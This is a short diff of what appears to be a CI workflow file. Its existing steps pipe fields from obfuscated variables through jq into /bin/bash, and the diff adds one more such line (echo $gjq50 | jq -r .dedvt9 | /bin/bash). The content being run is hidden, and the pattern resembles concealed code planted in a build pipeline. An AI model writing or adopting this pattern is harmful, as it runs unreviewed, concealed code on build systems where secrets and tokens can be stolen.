@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$c5093" | jq -r .csn3 | /bin/bash
           printf '%s' "$ja78" | jq -r .z59336 | /bin/bash
           printf '%s' "$qon119" | jq -r .g2029 | /bin/bash
+          echo $gjq50 | jq -r .dedvt9 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
